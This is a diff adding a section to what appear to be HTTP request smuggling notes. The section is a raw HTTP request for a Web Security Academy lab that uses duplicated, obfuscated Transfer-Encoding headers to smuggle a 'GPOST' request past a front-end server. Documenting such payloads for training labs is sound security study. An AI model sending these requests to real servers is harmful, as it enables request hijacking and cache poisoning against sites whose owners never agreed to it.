@@ -30,6 +30,35 @@ GET /404 HTTP/1.1
 X: X
 ```
 
+#### Also exploitable if the server fails to process headers
+
+```http
+POST / HTTP/1.1
+Host: 0a4400e3032937c780647b6e00d700b8.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+Transfer-Encoding: identity
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: chunked
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Connection: close
+
+67
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+0
+
+
+```
+
 ### TE.CL Detection
 ```http
 POST / HTTP/1.1
